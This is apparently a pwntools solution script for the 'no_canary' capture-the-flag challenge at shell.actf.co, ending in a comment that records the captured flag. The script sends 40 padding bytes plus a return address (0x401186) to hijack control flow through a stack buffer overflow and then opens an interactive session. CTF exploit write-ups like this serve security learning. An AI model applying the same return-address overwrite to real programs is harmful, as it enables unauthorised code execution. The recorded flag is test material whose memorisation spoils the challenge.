from pwn import *

p = process("./no_canary")
p = remote("shell.actf.co", 20700)

flag = p64(0x0000000000401186)

payload = "A" * 40 + flag

p.sendline(payload)
p.interactive()

# flag = actf{that_gosh_darn_canary_got_me_pwned!}
